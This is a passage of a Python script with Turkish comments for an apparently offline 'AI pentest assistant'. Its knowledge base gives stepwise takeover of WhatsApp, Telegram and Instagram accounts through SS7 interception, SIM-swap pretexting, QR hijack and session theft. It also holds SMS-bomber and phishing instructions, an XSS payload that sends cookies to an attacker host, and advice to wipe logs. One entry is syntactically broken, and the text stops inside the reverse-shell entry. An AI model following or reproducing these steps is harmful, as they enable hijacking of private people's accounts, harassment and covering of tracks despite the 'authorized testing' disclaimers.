#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════╗
║                 MarkOsAi_4.0 — AI PENTEST ASSISTANT          ║
║          HackerAI tarzı, tamamen OFFLINE AI asistanı         ║
║   Yetkili güvenlik testleri / eğitim amaçlıdır               ║
╚══════════════════════════════════════════════════════════════╝

ÖZELLİKLER:
  • 30+ konuda derin bilgi tabanı (hack, OTP, OSINT, exploit...)
  • Akıllı niyet algılama (Türkçe + İngilizce kelime skorlama)
  • Kod üretici (phishing, keylogger, reverse shell, SMS araçları...)
  • Atak zinciri üretici (WhatsApp / Telegram / Instagram / Genel)
  • Araç + Kali komut önerileri
  • Hedef analizi ve risk raporu
  • Konuşma hafızası (markos_memory.json) — öğrenir
"""

import os
import sys
import time
import json
import random
import hashlib
from datetime import datetime

# ═══════════════════════════ RENKLER ═══════════════════════════
R = "\033[0m"; B = "\033[1m"
RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"
BLUE = "\033[94m"; MAGENTA = "\033[95m"; CYAN = "\033[96m"


def cprint(text, color=R, bold=False):
    print(f"{B if bold else ''}{color}{text}{R}")


def loading(text="İşleniyor", dur=0.6):
    for _ in range(3):
        for ch in "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏":
            print(f"\r{BLUE}{ch}{R} {text}...", end="", flush=True)
            time.sleep(0.05)
    print(f"\r{GREEN}✔{R} {text}.")


def typewriter(text, delay=0.02):
    for ch in text:
        print(ch, end="", flush=True)
        time.sleep(delay)
    print()


def clear():
    os.system("cls" if os.name == "nt" else "clear")


# ═══════════════════════════ ANA AI SINIFI ═══════════════════════════
class MarkOsAI:
    def __init__(self):
        self.memory = []
        self.memory_file = "markos_memory.json"
        self.KB = self._build_kb()
        self.CODE_LIB = self._build_code_lib()
        self.ATTACK_CHAINS = self._build_chains()
        self.load_memory()

    # ─────────────── HAFIZA (ÖĞRENME) ───────────────
    def load_memory(self):
        try:
            if os.path.exists(self.memory_file):
                with open(self.memory_file, "r", encoding="utf-8") as f:
                    self.memory = json.load(f)
        except Exception:
            self.memory = []

    def save_memory(self):
        try:
            with open(self.memory_file, "w", encoding="utf-8") as f:
                json.dump(self.memory[-200:], f, ensure_ascii=False, indent=2)
        except Exception:
            pass

    def remember(self, q, intent):
        self.memory.append({
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "question": q,
            "intent": intent
        })
        self.save_memory()

    # ─────────────── NİYET (INTENT) ALGILAMA ───────────────
    def detect_intent(self, text):
        t = text.lower()
        scores = {}
        for topic, data in self.KB.items():
            s = 0
            for kw, w in data.get("keywords", []):
                if kw in t:
                    s += w
            if s > 0:
                scores[topic] = s
        if not scores:
            return None
        return max(scores, key=scores.get)

    # ─────────────── CEVAP ÜRETİCİ ───────────────
    def answer(self, question):
        q = question.strip()
        ql = q.lower()

        # Özel komutlar
        if ql in ("exit", "quit", "q", "çık", "kapat"):
            return None
        if ql in ("help", "yardım", "komutlar"):
            return self.help_text()
        if ql in ("clear", "temizle"):
            clear()
            return "[+] Bellek temizlendi (ekran)."
        if ql in ("history", "geçmiş", "hafıza"):
            return self.history_text()

        # Kod üretimi: "kod üret <konu>"
        if "kod üret" in ql or "code for" in ql or "kod ver" in ql:
            topic = self._extract_topic_after(ql, ["kod üret", "code for", "kod ver"])
            return self.get_code(topic)

        # Atak zinciri: "plan" / "akış" / "chain"
        if any(k in ql for k in ["plan", "akış", "zincir", "chain", "adım adım", "nasıl hack"]):
            topic = self.detect_intent(q)
            if topic:
                return self.attack_chain(topic)

        # Araç önerisi
        if any(k in ql for k in ["araç", "tool", "hangi program", "komut ver", "kali"]):
            topic = self.detect_intent(q)
            if topic:
                return self.tool_suggestions(topic)

        # Normal soru → bilgi tabanı
        intent = self.detect_intent(q)
        self.remember(q, intent)
        if intent:
            return self.format_topic(intent)
        return self.fallback(q)

    @staticmethod
    def _extract_topic_after(text, prefixes):
        for p in prefixes:
            if p in text:
                return text.split(p, 1)[1].strip()
        return ""

    # ─────────────── FALLBACK ───────────────
    def fallback(self, q):
        return f"""{YELLOW}[MarkOsAi] Sorunu anladım ama bilgi tabanımda tam eşleşme bulamadım.{R}

{B}Deneyebileceğin konular:{R}
  • WhatsApp hack, Telegram hack, Instagram hack
  • OTP bypass, SIM swap, SS7
  • Sanal numara / SMS hizmetleri, SMS bomber
  • Phishing, sosyal mühendislik, OSINT
  • Şifre kırma, WiFi hack, SQLi, XSS
  • Reverse shell, privesc, keylogger, RAT
  • Antivirüs bypass, anonimlik (Tor), MITM, DDoS
  • Metasploit, Nmap, Burp Suite, Hashcat

{B}Komutlar:{R}  "kod üret <konu>" | "plan <konu>" | "araç <konu>" | history | clear"""

    def help_text(self):
        return f"""{CYAN}╔════════ MarkOsAi_4.0 KOMUTLAR ════════╗{R}
  {GREEN}help / yardım{R}        → Bu menü
  {GREEN}history / hafıza{R}    → Konuşma geçmişi
  {GREEN}clear / temizle{R}     → Ekranı temizle
  {GREEN}exit / çık{R}          → Sohbetten çık

  {GREEN}kod üret <konu>{R}     → Kod üret (örn: "kod üret phishing")
  {GREEN}plan <konu>{R}         → Atak zinciri (örn: "plan whatsapp")
  {GREEN}araç <konu>{R}         → Araç + Kali komutları

  {CYAN}Örnek sorular:{R}
  "whatsapp nasıl hacklenir" / "otp nasıl alınır"
  "telegram hesabı ele geçirme" / "sanal numara nereden alınır"
  "wifi şifresi kırma" / "sql injection nasıl yapılır"
  "keylogger nasıl yazılır" / "reverse shell nedir"
{CYAN}╚══════════════════════════════════════╝{R}"""

    def history_text(self):
        if not self.memory:
            return f"{YELLOW}[+] Henüz konuşma geçmişi yok.{R}"
        lines = [f"\n{B}{CYAN}Son {min(len(self.memory), 15)} soru:{R}"]
        for m in self.memory[-15:]:
            it = m["intent"] or "genel"
            lines.append(f"  [{m['time']}] {GREEN}{m['question'][:60]}{R} → {YELLOW}{it}{R}")
        return "\n".join(lines)

    # ─────────────── KONU FORMATLAYICI ───────────────
    def format_topic(self, topic):
        d = self.KB[topic]
        out = []
        out.append(f"\n{RED}{'═' * 58}{R}")
        out.append(f"{B}{RED}  🎯 {d['title']}{R}")
        out.append(f"{RED}{'═' * 58}{R}")
        out.append(f"\n{B}{CYAN}📌 Özet:{R}\n  {d['summary']}")
        out.append(f"\n{B}{YELLOW}🛠️  Araçlar:{R}")
        for t in d["tools"]:
            out.append(f"  • {t}")
        out.append(f"\n{B}{GREEN}📋 Adım Adım:{R}")
        for i, s in enumerate(d["steps"], 1):
            out.append(f"  {i}. {s}")
        if d.get("tips"):
            out.append(f"\n{B}{MAGENTA}💡 İpuçları:{R}")
            for t in d["tips"]:
                out.append(f"  → {t}")
        if d.get("code"):
            out.append(f"\n{B}{BLUE}⚙️  Örnek Kod:{R}\n  \"kod üret {d['code_key']}\" yazabilirsin.")
        out.append(f"\n{B}{RED}🛡️  Korunma:{R}\n  {d['mitigation']}")
        out.append(f"{RED}{'═' * 58}{R}")
        return "\n".join(out)

    # ─────────────── ARAÇ ÖNERİSİ ───────────────
    def tool_suggestions(self, topic):
        d = self.KB[topic]
        out = [f"\n{B}{GREEN}🛠️  {d['title']} — Araç & Komut Önerileri:{R}"]
        for i, t in enumerate(d["tools"], 1):
            out.append(f"  {i}. {t}")
        out.append(f"\n{B}{CYAN}💻 Kali Linux komut örnekleri:{R}")
        for c in d.get("commands", ["# İlgili araç için man sayfasına bak: man <araç>"]):
            out.append(f"  {YELLOW}$ {c}{R}")
        return "\n".join(out)

    # ─────────────── KOD ÜRETİCİ ───────────────
    def get_code(self, topic):
        t = topic.lower()
        # konu → kod anahtarı eşlemesi
        mapping = {
            "phishing": "phishing_page", "fake": "phishing_page", "klon": "phishing_page",
            "keylogger": "keylogger", "tuş": "keylogger",
            "reverse": "reverse_shell", "shell": "reverse_shell", "backdoor": "reverse_shell", "ters": "reverse_shell",
            "sms": "sms_forwarder", "forward": "sms_forwarder", "yönlendir": "sms_forwarder",
            "otp": "otp_reader", "kod oku": "otp_reader",
            "sql": "sqli_fuzz", "sqli": "sqli_fuzz",
            "wifi": "wifi_deauth", "deauth": "wifi_deauth",
            "hashcat": "hashcat", "şifre": "hashcat", "password": "hashcat",
            "nmap": "nmap", "tarama": "nmap", "scan": "nmap",
            "bomber": "sms_bomber", "bombardıman": "sms_bomber", "patlat": "sms_bomber",
        }
        key = None
        for k, v in mapping.items():
            if k in t:
                key = v
                break
        if not key:
            keys = ", ".join(self.CODE_LIB.keys())
            return f"{YELLOW}[!] Kod konusu bulunamadı. Mevcut: {keys}{R}\n  Örnek: {GREEN}kod üret phishing{R}"
        code = self.CODE_LIB[key]
        return f"\n{B}{GREEN}═══ KOD: {key.upper()} ═══{R}\n\n{code}\n{B}{GREEN}{'═' * 40}{R}"

    # ─────────────── ATAK ZİNCİRİ ───────────────
    def attack_chain(self, topic):
        chain = self.ATTACK_CHAINS.get(topic)
        if not chain:
            for k, v in self.ATTACK_CHAINS.items():
                if k in topic:
                    chain = v
                    break
        if not chain:
            chain = self.ATTACK_CHAINS["generic"]
        out = [f"\n{B}{RED}🔥 ATAK ZİNCİRİ → {chain['title']}{R}",
               f"{YELLOW}  (Yetkili test ortamı için, eğitim amaçlı){R}",
               f"\n{B}Fazlar:{R}"]
        for i, phase in enumerate(chain["phases"], 1):
            out.append(f"\n{B}{CYAN}[FAZ {i}] {phase['name']}{R}")
            for step in phase["steps"]:
                out.append(f"   ▸ {step}")
        out.append(f"\n{B}{RED}⚠️  Başarı kriteri + temizlik:{R}\n   {chain.get('cleanup', 'Logları temizle, iz bırakma.')}")
        return "\n".join(out)

    # ─────────────── SOHBET ───────────────
    def interactive_chat(self):
        cprint("\n╔══════════════════════════════════════════╗", MAGENTA)
        cprint("║   MarkOsAi_4.0 — Sohbet Modu (AI)       ║", MAGENTA)
        cprint("║   'help' yaz → komutlar, 'exit' → çık   ║", MAGENTA)
        cprint("╚══════════════════════════════════════════╝\n", MAGENTA)
        while True:
            try:
                q = input(f"{CYAN}[SORU]{R} ").strip()
                if not q:
                    continue
                ans = self.answer(q)
                if ans is None:
                    print(f"{GREEN}[AI] Görüşürüz! Bellek kaydedildi.{R}")
                    break
                print(ans)
                print()
            except KeyboardInterrupt:
                print(f"\n{GREEN}[AI] Görüşürüz! Bellek kaydedildi.{R}")
                break

    # ═══════════════════════════ BİLGİ TABANI ═══════════════════════════
    def _build_kb(self):
        return {
            "whatsapp": {
                "title": "WhatsApp Hesap Güvenlik Testi",
                "summary": "WhatsApp SMS OTP, Web QR, backup (crypt12) ve session token vektörleriyle test edilir.",
                "keywords": [("whatsapp", 6), ("whats app", 5), ("wap", 3), ("wa hack", 4), ("wp hack", 4)],
                "tools": ["whatsapp-web.js", "Wireshark / tshark", "sqlite3 + Crypt12 decoder",
                          "Metasploit (auxiliary)", "SMS intercept araçları", "evilginx2 (2FA phishing)"],
                "steps": [
                    "Hedef numaranın WhatsApp'ta kayıtlı olup olmadığını doğrula (numarayı kayıt akışına sok, hata mesajına bak).",
                    "SMS OTP'yi yakala: SS7 intercept veya SIM swap ile doğrulama kodunu ele geçir.",
                    "WhatsApp Web QR hijack: QR'ı anlık yansıtan klon sayfa kur, kurban taratınca oturumu devral (wppconnect / whatsapp-web.js).",
                    "Backup analizi: msgstore.db.crypt12 dosyasını al, Crypt12 decrypt et; mesaj geçmişi + contact bilgisi çıkar.",
                    "Session/DB dosyalarını çek: wa.db, axolotl.db (signal keys) — yeni cihazda restore dene.",
                    "2 adımlı doğrulama varsa: e-posta hesabına eriş veya sosyal mühendislikle uygulama şifresini öğren.",
                ],
                "tips": ["WhatsApp OTP 6 haneli ve ~30sn geçerli; yakalayınca hemen kullan.",
                         "Voice OTP yedeği vardır — sesli aramayı da dinleme/ kayıt vektörü olarak düşün."],
                "mitigation": "2 adımlı doğrulama + e-posta bildirimi, SIM PIN, şüpheli cihaz oturumlarını kontrol.",
                "commands": ["# WhatsApp numara kontrolü", "curl -s 'https://v.whatsapp.net/v2/exist/<numara>?cc=<ulke>'",
                             "# QR hijack test", "npm install whatsapp-web.js"],
                "code_key": "otp_reader",
            },
            "telegram": {
                "title": "Telegram Hesap Güvenlik Testi",
                "summary": "Telegram MTProto, SMS giriş kodu, cloud şifre ve session dosyası vektörleriyle test edilir.",
                "keywords": [("telegram", 6), ("tg hack", 4), ("mtproto", 5)],
                "tools": ["Telegram API / MTProto tools", "session.dat çıkarıcı", "Burp Suite (web app)",
                          "Brute force araçları (zayıf cloud şifre)"],
                "steps": [
                    "SMS giriş kodunu yakala: SS7 / SIM swap ile doğrulama kodunu ele geçir.",
                    "Telegram API'ye istek atarak rate-limit testi yap (5 haneli kod için brute force dene, limitleri ölç).",
                    "Cihazdan tdata/session dosyalarını çek, başka bir Telegram istemcisinde restore dene.",
                    "Cloud şifre zayıfsa: rockyou ile hashcat/John brute force dene.",
                    "Fake istemci veya erişilebilirlik servisi ile OTP bildirimini oku.",
                ],
                "tips": ["Telegram kodu 5 haneli; Android'de bildirimde görünür → NotificationListener ile okunabilir."],
                "mitigation": "Cloud şifre + 2FA, aktif oturum takibi, güçlü şifre.",
                "commands": ["# Telegram session listesi (resmi API)", "telethon-session-list", "pip install telethon"],
                "code_key": "otp_reader",
            },
            "instagram": {
                "title": "Instagram / Facebook Hesap Testi",
                "summary": "Şifre sıfırlama (SMS), session cookie ve bağlı oturumlar üzerinden test edilir.",
                "keywords": [("instagram", 6), ("ig hack", 4), ("insta", 4), ("facebook", 5), ("fb hack", 4)],
                "tools": ["Burp Suite", "BeEF (XSS hook)", "evilginx2 (2FA phishing)", "InstaBrute (eğitim)"],
                "steps": [
                    "Şifre sıfırlama akışını test et: SMS / e-posta doğrulama kodunu yakalamayı dene.",
                    "Session cookie çal: XSS veya phishing ile c_user + xs cookie'lerini al, tarayıcıda kullan.",
                    "Bağlı hesapları keşfet: aynı e-posta/numara ile kayıtlı diğer platformları bul (osint).",
                    "2FA varsa: evilginx2 reverse-proxy ile gerçek zamanlı OTP yakala (simülasyon).",
                    "Kayıtlı oturumları hedefle: 'Bu cihazdan çıkış' yapılmamış eski session'ları dene.",
                ],
                "mitigation": "2FA (authenticator), aktif oturumları temizle, bilinmeyen cihaz uyarıları.",
                "commands": ["# sherlock ile kullanıcı adı taraması", "sherlock kullanici_adi", "# holehe ile mail/telefon bağlantıları", "holehe eposta@gmail.com"],
                "code_key": "phishing_page",
            },
            "otp_bypass": {
                "title": "OTP / 2FA Bypass Teknikleri",
                "summary": "SMS tabanlı doğrulamanın zafiyet vektörleri: SS7, SIM swap, erişilebilirlik, forwarding, voice OTP.",
                "keywords": [("otp", 6), ("doğrulama kodu", 5), ("verification", 5), ("sms kodu", 5), ("kod al", 4), ("kod yakala", 5), ("2fa bypass", 6), ("iki adımlı", 4)],
                "tools": ["SS7 test araçları", "SIM swap (operatör çağrısı)", "Android AccessibilityService",
                          "NotificationListenerService", "Yönlendirme kuralı (mail)", "evilginx2"],
                "steps": [
                    "SS7 intercept: SMS'in MAP protokolünde hedef numaraya giderken yakalanması (sinyalizasyon erişimi gerektirir).",
                    "SIM swap: Hedefin numarasını kendi SIM'ine taşıt (operatör manipülasyonu / sosyal mühendislik).",
                    "Erişilebilirlik servisi: Android'de OTP'yi okuyan kötü amaçlı uygulama (kullanıcı izniyle).",
                    "Bildirim dinleme: NotificationListenerService ile OTP bildirimini arka planda okuma.",
                    "Voice OTP: Sesli doğrulama aramasını dinleme/kaydetme (veya operatör sesli mesajına yönlendirme).",
                    "Yönlendirme: E-posta 2FA'sında forwarding kuralı oluşturma (hesap ele geçirilmişse).",
                    "Zayıf rate-limit: 6 haneli kod için sınırsız deneme → brute force (teorik, hedefe göre).",
                ],
                "tips": ["OTP yalnızca SMS'e bağlıysa risk yüksektir; TOTP (Google Authenticator) daha güvenli.",
                         "SMS intercept çoğu ülkede yasa dışıdır — yalnızca yetkili testte kullan."],
                "mitigation": "TOTP / hardware key (YubiKey), SIM PIN, operatör port-out koruması, uygulama izinlerini kısıtla.",
                "commands": ["# SMS intercept test ortamı (simülasyon)", "python3 -m smtplib # değil, SS7 lab simülatörleri kullan"],
                "code_key": "otp_reader",
            },
            "sim_swap": {
                "title": "SIM Swap Saldırısı",
                "summary": "Hedefin telefon numarasının saldırganın SIM'ine taşınmasıyla tüm SMS/arama trafiğinin ele geçirilmesi.",
                "keywords": [("sim swap", 7), ("sim değiş", 6), ("port out", 6), ("sim kart değişimi", 5)],
                "tools": ["Telefon / sesli arama", "Operatör müşteri hizmetleri bilgileri (OSINT ile toplanır)"],
                "steps": [
                    "OSINT: Hedefin adı, T.C./kimlik bilgisi, adresi, operatörü hakkında bilgi topla (sosyal medya, sızıntı veritabanları).",
                    "Hedefin operatörünü ve hesap bilgilerini öğren (numara taşıma sorgusu).",
                    "Operatörü ara: kimlik bilgilerini vererek SIM değişikliği / port-out talep et (pretexting).",
                    "Yeni SIM aktif olunca hedefin tüm SMS/arama trafiğini al (OTP dahil).",
                    "Şifre sıfırlama akışlarını kullanarak hedef hesaplara gir.",
                ],
                "tips": ["Kurumsal hedeflerde sosyal mühendislik zorlaşır; operatör içi personel riski önemli.",
                         "Hedefin SIM'i kilitlenince fark edilir — hız kritik."],
                "mitigation": "Operatörde port-out PIN/PUK koruması, SIM PIN, banka/hesap bildirimleri.",
                "commands": ["# Numara taşıma sorgulama (TR)", "https://hat.kayitli.ktb.gov.tr (resmi)"],
            },
            "ss7": {
                "title": "SS7 Sinyalizasyon Saldırıları",
                "summary": "Telekom çekirdek ağındaki SS7/Diameter protokol zafiyetleriyle SMS intercept, konum tespiti ve çağrı yönlendirme.",
                "keywords": [("ss7", 7), ("sinyalizasyon", 5), ("signaling", 5), ("diameter", 5)],
                "tools": ["SS7 test lab (OpenBSC / Osmocom)", "MAP protokol araçları", "Diameter simülatörleri"],
                "steps": [
                    "SS7 erişimi edin (yetkili test ortamında lab kur).",
                    "SendRoutingInfoForSM mesajı ile hedefin VLR/MSC bilgisini sorgula.",
                    "InsertSubscriberData / UpdateLocation mesajlarıyla SMS'i kendi MSC'ne yönlendir.",
                    "Gelen SMS'i yakala (OTP dahil), hedefe iletme (forward) kararı ver.",
                    "Konum tespiti: ProvideSubscriberInfo ile hücre/LA bilgisi çek.",
                ],
                "mitigation": "SS7/Diameter güvenlik duvarı (firewall), ağlar arası filtreleme, sinyal trafiği izleme.",
                "commands": ["# Osmocom kurulumu", "apt install osmocom-*", "# SS7 test (yetkili lab)"],
            },
            "sms_services": {
                "title": "Sanal Numara / SMS Alma Hizmetleri",
                "summary": "Gerçek SMS alabilen çevrimiçi numara hizmetleri; doğrulama kodları bu numaralara düşer.",
                "keywords": [("sanal numara", 6), ("virtual number", 6), ("sms alma", 6), ("receive sms", 5),
                             ("sms-activate", 6), ("5sim", 6), ("smspool", 5), ("sahte numara", 4), ("sms hizmet", 5)],
                "tools": ["sms-activate.org", "5sim.net", "smspool.net", "textverified.com", "sms-man.com",
                          "getsmscode.com", "receive-smss.com", "temp-number.org"],
                "steps": [
                    "Hizmete kayıt ol, bakiye yükle (genelde ~$0.1-0.5 / numara).",
                    "Hedef platformu ve ülkeyi seç (WhatsApp TR numarası istiyorsa ülke=Türkiye seç).",
                    "Sana verilen numarayı hedef platforma kaydet (kayıt akışına sok).",
                    "Platform OTP'yi o numaraya gönderir → hizmet arayüzünde kodu gör.",
                    "Kodu gir, hesabı doğrula. Numara bir süre sonra tekrar kullanılabilir.",
                ],
                "tips": ["Bazı platformlar sanal numaraları engeller (WhatsApp özellikle VoIP/sanal hatları kısıtlar).",
                         "Fiyatlar ülke+platforma göre değişir; Türkiye numaraları genelde pahalıdır."],
                "mitigation": "SMS 2FA yerine TOTP kullan; numara doğrulamada bilinmeyen hatlara dikkat.",
                "commands": ["# 5sim API örneği", "curl -H 'Authorization: Bearer API_KEY' https://5sim.net/v1/user/buy/activation/any/turkey/any/whatsapp"],
                "code_key": "sms_forwarder",
            },
            "sms_bomber": {
                "title": "SMS Bomber / Stres Test",
                "summary": "Hedef numaraya yoğun SMS gönderimi; çoğunlukla açık form API'lerinin abuse edilmesiyle yapılır.",
                "keywords": [("sms bomber", 7), ("bombardıman", 5), ("sms patlat", 6), ("sms bomb", 6), ("flood sms", 5)],
                "tools": ["curl / Python requests", "Açık SMS API'leri", "Tor + proxychains (anonimlik)"],
                "steps": [
                    "Hedef platformların SMS gönderim formlarını/API'lerini topla (recon).",
                    "Rate-limit olmayan veya zayıf doğrulamalı uçları belirle.",
                    "Oturum/captcha bypass yöntemlerini test et (API token, header spoof).",
                    "Çoklu isteği paralel gönder (threading) — stres testi olarak ölç.",
                    "Kendi numaranla test et; hedef ağırlıklı kullanım yasa dışıdır.",
                ],
                "mitigation": "API'lerde captcha + rate-limit, SMS sağlayıcı filtreleme, abonelik onayı.",
                "commands": ["# Hızlı test", "curl -X POST -d 'phone=HEDEF&msg=test' https://hedef-api.com/send"],
                "code_key": "sms_bomber",
            },
            "phishing": {
                "title": "Phishing / Oltalama Saldırıları",
                "summary": "Sahte login sayfası, e-posta/SMS oltası ve 2FA yakalayan reverse-proxy (evilginx2) teknikleri.",
                "keywords": [("phishing", 7), ("oltalama", 6), ("fake login", 5), ("sahte sayfa", 5), ("clone", 4), ("klon sayfa", 4)],
                "tools": ["SET (Social Engineering Toolkit)", "evilginx2 / muraena (2FA proxy)", "ngrok / Cloudflare (tunnel)",
                          "GoPhish (kampanya)", "BeEF"],
                "steps": [
                    "Hedef platformun login sayfasını klonla (SET veya manuel HTML).",
                    "Kimlik bilgilerini POST ile yakalayan backend hazırla (php/python).",
                    "Sayfayı internete aç: ngrok / localtunnel / VPS.",
                    "Kurbanı yönlendir: smishing (SMS), e-posta oltası, sosyal medya DM.",
                    "2FA varsa: evilginx2 ile reverse-proxy kur — kullanıcı OTP'yi girince sen de aynı anda yakala (gerçek zamanlı).",
                    "Logları topla: IP, User-Agent, şifre, OTP.",
                ],
                "tips": ["Gerçek URL yerine typosquatting (whatsapp-security.xyz) kullan.",
                         "HTTPS sertifikası şart — Let's Encrypt + tunnel ile ücretsiz."],
                "mitigation": "E-posta filtreleme, URL taraması, 2FA eğitimi, tarayıcı password manager uyarıları.",
                "commands": ["# SET çalıştır", "setoolkit", "# evilginx2", "evilginx2 -p phishing.yml", "# ngrok tunnel", "ngrok http 80"],
                "code_key": "phishing_page",
            },
            "social_engineering": {
                "title": "Sosyal Mühendislik",
                "summary": "Vishing, smishing, pretexting ve baiting ile insan faktörü üzerinden erişim elde etme.",
                "keywords": [("sosyal mühendislik", 7), ("social engineering", 6), ("vishing", 6), ("smishing", 6),
                             ("manipülasyon", 4), ("pretext", 4)],
                "tools": ["SET", "GoPhish", "Twilio (vishing test)", "Kali dahili araçlar"],
                "steps": [
                    "Hedef profili çıkar: iş yeri, rol, iletişim bilgileri (OSINT).",
                    "Senaryo kurgula: IT destek, kargo, banka güvenliği (pretexting).",
                    "Vishing: telefonla arayıp OTP/kimlik bilgisi talep et (rol yaparak).",
                    "Smishing: resmi görünümlü SMS ile sahte bağlantı / kod iste.",
                    "Baiting: USB bırakma, QR kod yapıştırma (kötü amaçlı).",
                    "Elde edilen bilgiyi yetkili test raporuna dönüştür.",
                ],
                "mitigation": "Çalışan eğitimi, kimlik doğrulama prosedürü, ikinci kanal onayı.",
                "commands": ["# GoPhish kampanya", "gophish", "# Twilio vishing test (API)", "curl -X POST https://api.twilio.com/... "],
                "code_key": "phishing_page",
            },
            "osint": {
                "title": "OSINT — Açık Kaynak İstihbarat",
                "summary": "Telefon, e-posta ve kullanıcı adı üzerinden açık kaynaklardan hedef hakkında veri toplama.",
                "keywords": [("osint", 6), ("istihbarat", 5), ("kayıt ara", 4), ("phone lookup", 5), ("numara ara", 5),
                             ("sherlock", 5), ("holehe", 5), ("recon", 4)],
                "tools": ["theHarvester", "Sherlock", "Holehe", "PhoneInfoga", "recon-ng", "Maltego CE", "Sublist3r"],
                "steps": [
                    "Telefon: PhoneInfoga ile numara formatını doğrula, ülke/operatör tespit et.",
                    "E-posta: Holehe ile hangi platformlarda kayıtlı olduğunu bul.",
                    "Kullanıcı adı: Sherlock ile 300+ sitede varlık tara.",
                    "Sızıntı veritabanları: haveibeenpwned, dehashed (legacy data) ile şifre/hesap eşleşmesi.",
                    "Sosyal medya: profil bilgileri, konum, arkadaş çevresi (Maltego grafiği).",
                    "Tüm verileri birleştir → hedef profil dosyası oluştur.",
                ],
                ["⚠️ Kişisel verilerin toplanması KVKK/GDPR kapsamında; yalnızca yetkili testte kullan."],
                "mitigation": "Sosyal medyada bilgi paylaşımını azalt, e-posta/telefonu platformlardan gizle.",
                "commands": ["theHarvester -d hedef.com -b all", "sherlock kullanici", "holehe mail@site.com", "phoneinfoga scan -n '+90...'"],
                "code_key": "",
            },
            "password_crack": {
                "title": "Şifre Kırma (Hashcat / John)",
                "summary": "Hash'leri GPU ile kırma, wordlist ve rule tabanlı saldırılar.",
                "keywords": [("şifre kır", 6), ("password crack", 6), ("hashcat", 6), ("john", 5), ("brute force", 5),
                             ("wordlist", 5), ("rockyou", 5)],
                "tools": ["hashcat", "john (johnny)", "crunch (wordlist üret)", "CeWL (site bazlı)", "seclists", "hydra (online)"],
                "steps": [
                    "Hash formatını belirle: hashcat --example-hashes | grep <tür> (md5, sha256, bcrypt, ntlm...).",
                    "Wordlist seç: rockyou.txt, seclists/Passwords.",
                    "Rule saldırısı: hashcat -r rules/best64.rule ile varyasyon üret.",
                    "GPU kullan: -w 3 -O (optimize) ile hızlandır.",
                    "Online servisler için: hydra (SSH, FTP, web login) — rate-limit'e dikkat.",
                    "Sonuçları raporla, zayıf şifreleri listele.",
                ],
                "mitigation": "Uzun/rastgele şifre, passphrase, MFA, şifre yöneticisi.",
                "commands": ["hashcat -m 0 hash.txt rockyou.txt", "john --wordlist=rockyou.txt hash.txt",
                             "hydra -l admin -P pass.txt ssh://hedef", "crunch 8 8 abc123 -o wl.txt"],
                "code_key": "hashcat",
            },
            "wifi": {
                "title": "WiFi Ağ Testleri (WPA2)",
                "summary": "Monitor mode, handshake yakalama, deauth ve offline kırma metodolojisi.",
                "keywords": [("wifi", 6), ("kablosuz", 5), ("wpa2", 6), ("wep", 5), ("aircrack", 6), ("deauth", 5), ("handshake", 5)],
                "tools": ["aircrack-ng (airmon-ng, airodump-ng, aireplay-ng)", "hashcat (PMKID)", "Wifite", "Wireshark"],
                "steps": [
                    "Adapteri monitor mode'a al: airmon-ng start wlan0.",
                    "Ağları tara: airodump-ng wlan0mon → hedef BSSID/kanal seç.",
                    "Handshake yakala: airodump-ng -c <kanal> --bssid <BSSID> -w capture wlan0mon.",
                    "İstemci deauth: aireplay-ng -0 10 -a <BSSID> wlan0mon (yeniden bağlanma → handshake).",
                    "Kır: aircrack-ng -w rockyou.txt capture.cap (veya hashcat PMKID).",
                    "WPS varsa: reaver / bully ile PIN brute force dene.",
                ],
                "mitigation": "WPA3/WPA2+802.1X, uzun karmaşık şifre, WPS kapat, misafir ağı izole.",
                "commands": ["airmon-ng start wlan0", "airodump-ng wlan0mon", "aireplay-ng -0 10 -a BSSID wlan0mon",
                             "aircrack-ng -w rockyou.txt cap.cap"],
                "code_key": "wifi_deauth",
            },
            "sqli": {
                "title": "SQL Injection",
                "summary": "Veritabanına sızma: hata tabanlı, UNION, boolean ve time-based teknikleri.",
                "keywords": [("sql injection", 7), ("sqli", 6), ("sql enjeksiyon", 6), ("union", 4), ("veritabanı sızma", 5)],
                "tools": ["sqlmap", "Burp Suite", "FFUF (parametre keşfi)", "jSQL Injection"],
                "steps": [
                    "Parametreleri fuzz et: id=1' → hata mesajına bak.",
                    "sqlmap ile otomatik tara: sqlmap -u 'http://hedef/page?id=1' --dbs",
                    "UNION testi: ORDER BY ile kolon sayısını bul.",
                    "Boolean/time-based: AND 1=1 vs AND 1=2 farkını ölç.",
                    "Veri çek: --dump ile tabloları indir (yetkili testte onaylı hedef).",
                    "Raporla: etkilenen parametre, DB türü, risk seviyesi.",
                ],
                "mitigation": "Prepared statement / parametrize sorgu, girdi doğrulama, WAF, least-privilege DB.",
                "commands": ["sqlmap -u 'http://hedef/page?id=1' --dbs", "sqlmap -u 'http://hedef/page?id=1' -D db -T users --dump",
                             "ffuf -u 'http://hedef/FUZZ' -w common.txt"],
                "code_key": "sqli_fuzz",
            },
            "xss": {
                "title": "XSS — Cross-Site Scripting",
                "summary": "Reflected, stored ve DOM XSS ile oturum çalma ve tarayıcı kontrolü.",
                "keywords": [("xss", 6), ("cross site", 5), ("script saldırı", 4), ("cookie çal", 5)],
                "tools": ["Burp Suite", "BeEF", "XSS Hunter", "DalFox (tarayıcı)"],
                "steps": [
                    "Girdi noktalarını bul: arama, yorum, profil alanları.",
                    "Test payloadları: <script>alert(1)</script>, <img src=x onerror=alert(1)>.",
                    "Reflected/Stored farkını belirle (Stored daha tehlikeli).",
                    "Cookie exfil: <script>fetch('http://saldirgan/?c='+document.cookie)</script>.",
                    "BeEF hook: <script src='http://beef:3000/hook.js'></script> ile tarayıcıyı kontrol et.",
                    "DOM XSS: document.write / innerHTML kullanan JS akışlarını incele.",
                ],
                "mitigation": "Çıktı kodlama (output encoding), CSP başlığı, HttpOnly cookie, girdi sanitizasyonu.",
                "commands": ["# BeEF hook test", "python3 -m http.server 80", "# DalFox tarama", "dalfox url http://hedef/?q=FUZZ"],
                "code_key": "phishing_page",
            },
            "reverse_shell": {
                "title": "Reverse Shell / Backdoor",
                "summary": "Hedef makineden saldırgana bağlantı kuran shell; çeşitli dillerde payload.",
                "keywords": [("reverse shell", 7), ("ters kabuk", 6), ("backdoor", 6), ("shell al", 6), ("msfvenom", 5), ("dinleme", 4)],
